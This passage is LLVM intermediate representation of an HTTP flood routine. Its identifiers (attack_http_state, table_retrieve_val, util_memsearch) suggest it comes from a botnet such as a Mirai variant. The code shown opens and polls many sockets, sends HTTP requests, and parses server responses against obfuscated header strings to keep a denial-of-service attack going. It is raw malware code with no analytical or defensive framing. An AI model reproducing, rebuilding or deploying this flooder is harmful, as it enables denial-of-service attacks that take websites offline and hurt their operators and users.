  %866 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %865, i32 0, i32 0
  %867 = load i32, i32* %866, align 4
  %868 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %869 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %870 = call i32 @util_strlen(i8* %869)
  %871 = sext i32 %870 to i64
  %872 = call i64 @send(i32 %867, i8* %868, i64 %871, i32 16384)
  %873 = load i32, i32* %27, align 4
  %874 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %875 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %874, i32 0, i32 3
  store i32 %873, i32* %875, align 4
  %876 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %877 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %876, i32 0, i32 1
  store i8 6, i8* %877, align 4
  %878 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %879 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %878, i32 0, i32 0
  %880 = load i32, i32* %879, align 4
  %881 = srem i32 %880, 64
  %882 = zext i32 %881 to i64
  %883 = shl i64 1, %882
  %884 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %885 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %886 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %885, i32 0, i32 0
  %887 = load i32, i32* %886, align 4
  %888 = sdiv i32 %887, 64
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds [16 x i64], [16 x i64]* %884, i64 0, i64 %889
  %891 = load i64, i64* %890, align 8
  %892 = or i64 %891, %883
  store i64 %892, i64* %890, align 8
  %893 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %894 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %893, i32 0, i32 0
  %895 = load i32, i32* %894, align 4
  %896 = load i32, i32* %23, align 4
  %897 = icmp sgt i32 %895, %896
  br i1 %897, label %898, label %903

; <label>:898:                                    ; preds = %864
  %899 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %900 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %899, i32 0, i32 0
  %901 = load i32, i32* %900, align 4
  %902 = add nsw i32 %901, 1
  store i32 %902, i32* %23, align 4
  br label %903

; <label>:903:                                    ; preds = %898, %864
  br label %1031

; <label>:904:                                    ; preds = %624
  %905 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %906 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %905, i32 0, i32 1
  %907 = load i8, i8* %906, align 4
  %908 = zext i8 %907 to i32
  %909 = icmp eq i32 %908, 6
  br i1 %909, label %910, label %937

; <label>:910:                                    ; preds = %904
  %911 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %912 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %911, i32 0, i32 0
  %913 = load i32, i32* %912, align 4
  %914 = srem i32 %913, 64
  %915 = zext i32 %914 to i64
  %916 = shl i64 1, %915
  %917 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %918 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %918, i32 0, i32 0
  %920 = load i32, i32* %919, align 4
  %921 = sdiv i32 %920, 64
  %922 = sext i32 %921 to i64
  %923 = getelementptr inbounds [16 x i64], [16 x i64]* %917, i64 0, i64 %922
  %924 = load i64, i64* %923, align 8
  %925 = or i64 %924, %916
  store i64 %925, i64* %923, align 8
  %926 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %927 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %926, i32 0, i32 0
  %928 = load i32, i32* %927, align 4
  %929 = load i32, i32* %23, align 4
  %930 = icmp sgt i32 %928, %929
  br i1 %930, label %931, label %936

; <label>:931:                                    ; preds = %910
  %932 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %933 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %932, i32 0, i32 0
  %934 = load i32, i32* %933, align 4
  %935 = add nsw i32 %934, 1
  store i32 %935, i32* %23, align 4
  br label %936

; <label>:936:                                    ; preds = %931, %910
  br label %1030

; <label>:937:                                    ; preds = %904
  %938 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %939 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %938, i32 0, i32 1
  %940 = load i8, i8* %939, align 4
  %941 = zext i8 %940 to i32
  %942 = icmp eq i32 %941, 7
  br i1 %942, label %943, label %970

; <label>:943:                                    ; preds = %937
  %944 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %945 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %944, i32 0, i32 0
  %946 = load i32, i32* %945, align 4
  %947 = srem i32 %946, 64
  %948 = zext i32 %947 to i64
  %949 = shl i64 1, %948
  %950 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %951 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %952 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %951, i32 0, i32 0
  %953 = load i32, i32* %952, align 4
  %954 = sdiv i32 %953, 64
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds [16 x i64], [16 x i64]* %950, i64 0, i64 %955
  %957 = load i64, i64* %956, align 8
  %958 = or i64 %957, %949
  store i64 %958, i64* %956, align 8
  %959 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %960 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %959, i32 0, i32 0
  %961 = load i32, i32* %960, align 4
  %962 = load i32, i32* %23, align 4
  %963 = icmp sgt i32 %961, %962
  br i1 %963, label %964, label %969

; <label>:964:                                    ; preds = %943
  %965 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %966 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %965, i32 0, i32 0
  %967 = load i32, i32* %966, align 4
  %968 = add nsw i32 %967, 1
  store i32 %968, i32* %23, align 4
  br label %969

; <label>:969:                                    ; preds = %964, %943
  br label %1029

; <label>:970:                                    ; preds = %937
  %971 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %972 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %971, i32 0, i32 1
  %973 = load i8, i8* %972, align 4
  %974 = zext i8 %973 to i32
  %975 = icmp eq i32 %974, 10
  br i1 %975, label %976, label %1003

; <label>:976:                                    ; preds = %970
  %977 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %977, i32 0, i32 0
  %979 = load i32, i32* %978, align 4
  %980 = srem i32 %979, 64
  %981 = zext i32 %980 to i64
  %982 = shl i64 1, %981
  %983 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %984 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %985 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %984, i32 0, i32 0
  %986 = load i32, i32* %985, align 4
  %987 = sdiv i32 %986, 64
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds [16 x i64], [16 x i64]* %983, i64 0, i64 %988
  %990 = load i64, i64* %989, align 8
  %991 = or i64 %990, %982
  store i64 %991, i64* %989, align 8
  %992 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %993 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %992, i32 0, i32 0
  %994 = load i32, i32* %993, align 4
  %995 = load i32, i32* %23, align 4
  %996 = icmp sgt i32 %994, %995
  br i1 %996, label %997, label %1002

; <label>:997:                                    ; preds = %976
  %998 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %999 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %998, i32 0, i32 0
  %1000 = load i32, i32* %999, align 4
  %1001 = add nsw i32 %1000, 1
  store i32 %1001, i32* %23, align 4
  br label %1002

; <label>:1002:                                   ; preds = %997, %976
  br label %1028

; <label>:1003:                                   ; preds = %970
  %1004 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1005 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1004, i32 0, i32 1
  %1006 = load i8, i8* %1005, align 4
  %1007 = zext i8 %1006 to i32
  %1008 = icmp eq i32 %1007, 11
  br i1 %1008, label %1009, label %1018

; <label>:1009:                                   ; preds = %1003
  %1010 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1011 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1010, i32 0, i32 1
  store i8 0, i8* %1011, align 4
  %1012 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1013 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1012, i32 0, i32 0
  %1014 = load i32, i32* %1013, align 4
  %1015 = call i32 @close(i32 %1014)
  %1016 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1017 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1016, i32 0, i32 0
  store i32 -1, i32* %1017, align 4
  br label %1027

; <label>:1018:                                   ; preds = %1003
  %1019 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1020 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1019, i32 0, i32 1
  store i8 0, i8* %1020, align 4
  %1021 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1022 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1021, i32 0, i32 0
  %1023 = load i32, i32* %1022, align 4
  %1024 = call i32 @close(i32 %1023)
  %1025 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1026 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1025, i32 0, i32 0
  store i32 -1, i32* %1026, align 4
  br label %1027

; <label>:1027:                                   ; preds = %1018, %1009
  br label %1028

; <label>:1028:                                   ; preds = %1027, %1002
  br label %1029

; <label>:1029:                                   ; preds = %1028, %969
  br label %1030

; <label>:1030:                                   ; preds = %1029, %936
  br label %1031

; <label>:1031:                                   ; preds = %1030, %903
  br label %1032

; <label>:1032:                                   ; preds = %1031, %623
  br label %1033

; <label>:1033:                                   ; preds = %1032, %574
  br label %1034

; <label>:1034:                                   ; preds = %1033, %588, %511
  %1035 = load i32, i32* %9, align 4
  %1036 = add nsw i32 %1035, 1
  store i32 %1036, i32* %9, align 4
  br label %463

; <label>:1037:                                   ; preds = %463
  %1038 = load i32, i32* %23, align 4
  %1039 = icmp eq i32 %1038, 0
  br i1 %1039, label %1040, label %1041

; <label>:1040:                                   ; preds = %1037
  br label %440

; <label>:1041:                                   ; preds = %1037
  %1042 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1042, align 8
  %1043 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1043, align 8
  %1044 = load i32, i32* %23, align 4
  %1045 = call i32 @select(i32 %1044, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1045, i32* %24, align 4
  %1046 = call i64 @time(i64* null) #6
  %1047 = trunc i64 %1046 to i32
  store i32 %1047, i32* %27, align 4
  %1048 = load i32, i32* %24, align 4
  %1049 = icmp slt i32 %1048, 1
  br i1 %1049, label %1050, label %1051

; <label>:1050:                                   ; preds = %1041
  br label %440

; <label>:1051:                                   ; preds = %1041
  store i32 0, i32* %9, align 4
  br label %1052

; <label>:1052:                                   ; preds = %2531, %1051
  %1053 = load i32, i32* %9, align 4
  %1054 = load i32, i32* %18, align 4
  %1055 = icmp slt i32 %1053, %1054
  br i1 %1055, label %1056, label %2534

; <label>:1056:                                   ; preds = %1052
  %1057 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1058 = load i32, i32* %9, align 4
  %1059 = sext i32 %1058 to i64
  %1060 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1057, i64 %1059
  store %struct.attack_http_state* %1060, %struct.attack_http_state** %26, align 8
  %1061 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1062 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1061, i32 0, i32 0
  %1063 = load i32, i32* %1062, align 4
  %1064 = icmp eq i32 %1063, -1
  br i1 %1064, label %1065, label %1066

; <label>:1065:                                   ; preds = %1056
  br label %2531

; <label>:1066:                                   ; preds = %1056
  %1067 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1068 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1069 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1068, i32 0, i32 0
  %1070 = load i32, i32* %1069, align 4
  %1071 = sdiv i32 %1070, 64
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds [16 x i64], [16 x i64]* %1067, i64 0, i64 %1072
  %1074 = load i64, i64* %1073, align 8
  %1075 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1076 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1075, i32 0, i32 0
  %1077 = load i32, i32* %1076, align 4
  %1078 = srem i32 %1077, 64
  %1079 = zext i32 %1078 to i64
  %1080 = shl i64 1, %1079
  %1081 = and i64 %1074, %1080
  %1082 = icmp ne i64 %1081, 0
  br i1 %1082, label %1083, label %1107

; <label>:1083:                                   ; preds = %1066
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1084 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1085 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1084, i32 0, i32 0
  %1086 = load i32, i32* %1085, align 4
  %1087 = bitcast i32* %35 to i8*
  %1088 = call i32 @getsockopt(i32 %1086, i32 1, i32 4, i8* %1087, i32* %36) #6
  store i32 %1088, i32* %12, align 4
  %1089 = load i32, i32* %35, align 4
  %1090 = icmp eq i32 %1089, 0
  br i1 %1090, label %1091, label %1097

; <label>:1091:                                   ; preds = %1083
  %1092 = load i32, i32* %12, align 4
  %1093 = icmp eq i32 %1092, 0
  br i1 %1093, label %1094, label %1097

; <label>:1094:                                   ; preds = %1091
  %1095 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1096 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1095, i32 0, i32 1
  store i8 4, i8* %1096, align 4
  br label %1106

; <label>:1097:                                   ; preds = %1091, %1083
  %1098 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1099 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1098, i32 0, i32 0
  %1100 = load i32, i32* %1099, align 4
  %1101 = call i32 @close(i32 %1100)
  %1102 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1103 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1102, i32 0, i32 0
  store i32 -1, i32* %1103, align 4
  %1104 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1105 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1104, i32 0, i32 1
  store i8 0, i8* %1105, align 4
  br label %2531

; <label>:1106:                                   ; preds = %1094
  br label %1107

; <label>:1107:                                   ; preds = %1106, %1066
  %1108 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1109 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1110 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1109, i32 0, i32 0
  %1111 = load i32, i32* %1110, align 4
  %1112 = sdiv i32 %1111, 64
  %1113 = sext i32 %1112 to i64
  %1114 = getelementptr inbounds [16 x i64], [16 x i64]* %1108, i64 0, i64 %1113
  %1115 = load i64, i64* %1114, align 8
  %1116 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1117 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1116, i32 0, i32 0
  %1118 = load i32, i32* %1117, align 4
  %1119 = srem i32 %1118, 64
  %1120 = zext i32 %1119 to i64
  %1121 = shl i64 1, %1120
  %1122 = and i64 %1115, %1121
  %1123 = icmp ne i64 %1122, 0
  br i1 %1123, label %1124, label %2530

; <label>:1124:                                   ; preds = %1107
  %1125 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1126 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1125, i32 0, i32 1
  %1127 = load i8, i8* %1126, align 4
  %1128 = zext i8 %1127 to i32
  %1129 = icmp eq i32 %1128, 6
  br i1 %1129, label %1130, label %2093

; <label>:1130:                                   ; preds = %1124
  store i32 0, i32* %37, align 4
  %1131 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1131, i32 10240)
  %1132 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1133 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1132, i32 0, i32 0
  %1134 = load i32, i32* %1133, align 4
  %1135 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1136 = call i64 @recv(i32 %1134, i8* %1135, i64 10240, i32 16386)
  %1137 = trunc i64 %1136 to i32
  store i32 %1137, i32* %12, align 4
  %1138 = icmp slt i32 %1137, 1
  br i1 %1138, label %1139, label %1148

; <label>:1139:                                   ; preds = %1130
  %1140 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1141 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1140, i32 0, i32 0
  %1142 = load i32, i32* %1141, align 4
  %1143 = call i32 @close(i32 %1142)
  %1144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1144, i32 0, i32 0
  store i32 -1, i32* %1145, align 4
  %1146 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1147 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1146, i32 0, i32 1
  store i8 0, i8* %1147, align 4
  br label %2531

; <label>:1148:                                   ; preds = %1130
  %1149 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1150 = load i32, i32* %12, align 4
  %1151 = call i32 @util_memsearch(i8* %1149, i32 %1150, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1152 = icmp eq i32 %1151, -1
  br i1 %1152, label %1153, label %1157

; <label>:1153:                                   ; preds = %1148
  %1154 = load i32, i32* %12, align 4
  %1155 = icmp slt i32 %1154, 10240
  br i1 %1155, label %1156, label %1157

; <label>:1156:                                   ; preds = %1153
  br label %2531

; <label>:1157:                                   ; preds = %1153, %1148
  %1158 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1159 = load i32, i32* %12, align 4
  %1160 = call i32 @util_memsearch(i8* %1158, i32 %1159, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1161 = sext i32 %1160 to i64
  %1162 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1161
  store i8 0, i8* %1162, align 1
  %1163 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1164 = load i32, i32* %12, align 4
  %1165 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1166 = call i32 @util_stristr(i8* %1163, i32 %1164, i8* %1165)
  %1167 = icmp ne i32 %1166, -1
  br i1 %1167, label %1168, label %1171

; <label>:1168:                                   ; preds = %1157
  %1169 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1170 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1169, i32 0, i32 11
  store i32 2, i32* %1170, align 4
  br label %1171

; <label>:1171:                                   ; preds = %1168, %1157
  %1172 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1173 = load i32, i32* %12, align 4
  %1174 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1175 = call i32 @util_stristr(i8* %1172, i32 %1173, i8* %1174)
  %1176 = icmp ne i32 %1175, -1
  br i1 %1176, label %1177, label %1180

; <label>:1177:                                   ; preds = %1171
  %1178 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1179 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1178, i32 0, i32 11
  store i32 1, i32* %1179, align 4
  br label %1180

; <label>:1180:                                   ; preds = %1177, %1171
  %1181 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1181, i32 0, i32 12
  store i32 0, i32* %1182, align 4
  %1183 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1184 = load i32, i32* %12, align 4
  %1185 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1186 = call i32 @util_stristr(i8* %1183, i32 %1184, i8* %1185)
  %1187 = icmp ne i32 %1186, -1
  br i1 %1187, label %1188, label %1239

; <label>:1188:                                   ; preds = %1180
  %1189 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1190 = load i32, i32* %12, align 4
  %1191 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1192 = call i32 @util_stristr(i8* %1189, i32 %1190, i8* %1191)
  store i32 %1192, i32* %38, align 4
  %1193 = load i32, i32* %38, align 4
  %1194 = sext i32 %1193 to i64
  %1195 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1194
  %1196 = load i8, i8* %1195, align 1
  %1197 = sext i8 %1196 to i32
  %1198 = icmp eq i32 %1197, 32
  br i1 %1198, label %1199, label %1202

; <label>:1199:                                   ; preds = %1188
  %1200 = load i32, i32* %38, align 4
  %1201 = add nsw i32 %1200, 1
  store i32 %1201, i32* %38, align 4
  br label %1202

; <label>:1202:                                   ; preds = %1199, %1188
  %1203 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1204 = load i32, i32* %38, align 4
  %1205 = sext i32 %1204 to i64
  %1206 = getelementptr inbounds i8, i8* %1203, i64 %1205
  %1207 = load i32, i32* %12, align 4
  %1208 = load i32, i32* %38, align 4
  %1209 = sub nsw i32 %1207, %1208
  %1210 = call i32 @util_memsearch(i8* %1206, i32 %1209, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1210, i32* %39, align 4
  %1211 = load i32, i32* %39, align 4
  %1212 = icmp ne i32 %1211, -1
  br i1 %1212, label %1213, label %1238

; <label>:1213:                                   ; preds = %1202
  %1214 = load i32, i32* %38, align 4
  %1215 = sext i32 %1214 to i64
  %1216 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1215
  store i8* %1216, i8** %40, align 8
  %1217 = load i32, i32* %39, align 4
  %1218 = icmp sge i32 %1217, 2
  br i1 %1218, label %1219, label %1222

; <label>:1219:                                   ; preds = %1213
  %1220 = load i32, i32* %39, align 4
  %1221 = sub nsw i32 %1220, 2
  store i32 %1221, i32* %39, align 4
  br label %1222

; <label>:1222:                                   ; preds = %1219, %1213
  %1223 = load i32, i32* %38, align 4
  %1224 = load i32, i32* %39, align 4
  %1225 = add nsw i32 %1223, %1224
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1226
  store i8 0, i8* %1227, align 1
  %1228 = load i8*, i8** %40, align 8
  %1229 = load i8*, i8** %40, align 8
  %1230 = call i32 @util_strlen(i8* %1229)
  %1231 = call i8* @table_retrieve_val(i32 43, i32* null)
  %1232 = call i32 @util_stristr(i8* %1228, i32 %1230, i8* %1231)
  %1233 = icmp ne i32 %1232, 0
  br i1 %1233, label %1234, label %1237

; <label>:1234:                                   ; preds = %1222
  %1235 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1236 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1235, i32 0, i32 12
  store i32 1, i32* %1236, align 4
  br label %1237

; <label>:1237:                                   ; preds = %1234, %1222
  br label %1238

; <label>:1238:                                   ; preds = %1237, %1202
  br label %1239

; <label>:1239:                                   ; preds = %1238, %1180
  %1240 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1240, i32 0, i32 13
  store i32 0, i32* %1241, align 4
  %1242 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1243 = load i32, i32* %12, align 4
  %1244 = call i8* @table_retrieve_val(i32 41, i32* null)
  %1245 = call i32 @util_stristr(i8* %1242, i32 %1243, i8* %1244)
  %1246 = icmp ne i32 %1245, -1
  br i1 %1246, label %1247, label %1298

; <label>:1247:                                   ; preds = %1239
  %1248 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1249 = load i32, i32* %12, align 4
  %1250 = call i8* @table_retrieve_val(i32 41, i32* null)
  %1251 = call i32 @util_stristr(i8* %1248, i32 %1249, i8* %1250)
  store i32 %1251, i32* %41, align 4
  %1252 = load i32, i32* %41, align 4
  %1253 = sext i32 %1252 to i64
  %1254 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1253
  %1255 = load i8, i8* %1254, align 1
  %1256 = sext i8 %1255 to i32
  %1257 = icmp eq i32 %1256, 32
  br i1 %1257, label %1258, label %1261

; <label>:1258:                                   ; preds = %1247
  %1259 = load i32, i32* %41, align 4
  %1260 = add nsw i32 %1259, 1
  store i32 %1260, i32* %41, align 4
  br label %1261

; <label>:1261:                                   ; preds = %1258, %1247
  %1262 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1263 = load i32, i32* %41, align 4
  %1264 = sext i32 %1263 to i64
  %1265 = getelementptr inbounds i8, i8* %1262, i64 %1264
  %1266 = load i32, i32* %12, align 4
  %1267 = load i32, i32* %41, align 4
  %1268 = sub nsw i32 %1266, %1267
  %1269 = call i32 @util_memsearch(i8* %1265, i32 %1268, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1269, i32* %42, align 4
  %1270 = load i32, i32* %42, align 4
  %1271 = icmp ne i32 %1270, -1
  br i1 %1271, label %1272, label %1297

; <label>:1272:                                   ; preds = %1261
  %1273 = load i32, i32* %41, align 4
  %1274 = sext i32 %1273 to i64
  %1275 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1274
  store i8* %1275, i8** %43, align 8
  %1276 = load i32, i32* %42, align 4
  %1277 = icmp sge i32 %1276, 2
  br i1 %1277, label %1278, label %1281

; <label>:1278:                                   ; preds = %1272
  %1279 = load i32, i32* %42, align 4
  %1280 = sub nsw i32 %1279, 2
  store i32 %1280, i32* %42, align 4
  br label %1281

; <label>:1281:                                   ; preds = %1278, %1272
  %1282 = load i32, i32* %41, align 4
  %1283 = load i32, i32* %42, align 4
  %1284 = add nsw i32 %1282, %1283
  %1285 = sext i32 %1284 to i64
  %1286 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1285
  store i8 0, i8* %1286, align 1
  %1287 = load i8*, i8** %43, align 8
  %1288 = load i8*, i8** %43, align 8
  %1289 = call i32 @util_strlen(i8* %1288)
  %1290 = call i8* @table_retrieve_val(i32 42, i32* null)
  %1291 = call i32 @util_stristr(i8* %1287, i32 %1289, i8* %1290)
  %1292 = icmp ne i32 %1291, 0
  br i1 %1292, label %1293, label %1296

; <label>:1293:                                   ; preds = %1281
  %1294 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1295 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1294, i32 0, i32 13
  store i32 1, i32* %1295, align 4
  br label %1296

; <label>:1296:                                   ; preds = %1293, %1281
  br label %1297

; <label>:1297:                                   ; preds = %1296, %1261
  br label %1298

; <label>:1298:                                   ; preds = %1297, %1239
  %1299 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1300 = load i32, i32* %12, align 4
  %1301 = call i8* @table_retrieve_val(i32 40, i32* null)
  %1302 = call i32 @util_stristr(i8* %1299, i32 %1300, i8* %1301)
  %1303 = icmp ne i32 %1302, -1
  br i1 %1303, label %1304, label %1349

; <label>:1304:                                   ; preds = %1298
  %1305 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1306 = load i32, i32* %12, align 4
  %1307 = call i8* @table_retrieve_val(i32 40, i32* null)
  %1308 = call i32 @util_stristr(i8* %1305, i32 %1306, i8* %1307)
  store i32 %1308, i32* %44, align 4
  %1309 = load i32, i32* %44, align 4
  %1310 = sext i32 %1309 to i64
  %1311 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1310
  %1312 = load i8, i8* %1311, align 1
  %1313 = sext i8 %1312 to i32
  %1314 = icmp eq i32 %1313, 32
  br i1 %1314, label %1315, label %1318

; <label>:1315:                                   ; preds = %1304
  %1316 = load i32, i32* %44, align 4
  %1317 = add nsw i32 %1316, 1
  store i32 %1317, i32* %44, align 4
  br label %1318

; <label>:1318:                                   ; preds = %1315, %1304
  %1319 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
